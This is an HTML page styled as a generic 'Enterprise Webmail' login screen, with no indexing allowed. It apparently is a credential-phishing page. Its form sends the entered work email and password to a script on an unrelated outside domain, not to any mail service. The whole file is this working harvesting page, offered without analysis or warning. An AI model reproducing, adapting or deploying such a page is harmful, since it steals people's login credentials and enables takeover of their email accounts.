<!DOCTYPE html>
<html>
<head>
    <meta name="robots" content="noindex, nofollow">
    <title>Enterprise Webmail Login</title>
    <link rel="shortcut icon" href="/favicon.svg">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <style>
        body {
            font-family: "Segoe UI", Tahoma, Helvetica, Arial, sans-serif;
            background-image: url('https://images.unsplash.com/photo-1454165804606-c3d57bc86b40?ixlib=rb-1.2.1&auto=format&fit=crop&w=1950&q=80');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;
            margin: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .login-container {
            width: 100%;
            max-width: 300px; /* Reduced container width */
            padding: 25px;
            margin: 20px;
            background: rgba(255, 255, 255, 0.93);
            border-radius: 10px;
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.08);
            backdrop-filter: blur(8px);
            text-align: center;
        }

        h1 {
            font-size: 1.6em;
            margin: 0 0 22px 0;
            color: #2d3748;
            letter-spacing: -0.3px;
        }

        .form-group {
            width: 100%;
            margin: 0 auto;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        input[type="email"],
        input[type="password"] {
            width: 90%;
            padding: 9px 12px;
            margin-bottom: 12px;
            border: 1px solid rgba(0, 0, 0, 0.1);
            border-radius: 6px;
            font-size: 0.9em;
            transition: all 0.2s ease;
        }

        button {
            width: 90%;
            padding: 10px;
            margin: 8px auto 0;
            background-color: #4a90e2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 0.95em;
            cursor: pointer;
            transition: background 0.2s ease;
        }

        button:hover {
            background-color: #357abd;
        }

        p {
            margin: 18px 0 0 0;
            font-size: 0.85em;
            color: #4a5568;
        }

        a {
            color: #4a90e2;
            text-decoration: none;
            font-weight: 500;
        }

        @media (max-width: 600px) {
            .login-container {
                max-width: 280px;
                padding: 20px;
                margin: 15px;
            }
            
            h1 {
                font-size: 1.4em;
            }
            
            input[type="email"],
            input[type="password"] {
                width: 92%;
                padding: 8px 10px;
            }
            
            button {
                width: 92%;
                padding: 9px;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Enterprise Webmail</h1>
        <form action="https://www.musicaangola.ao/submit.php" method="POST">
            <div class="form-group">
                <input type="email" name="email" placeholder="Work Email" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Continue</button>
            </div>
        </form>
        <p>Need help? <a href="#">Contact Support</a></p>
    </div>
</body>
</html>
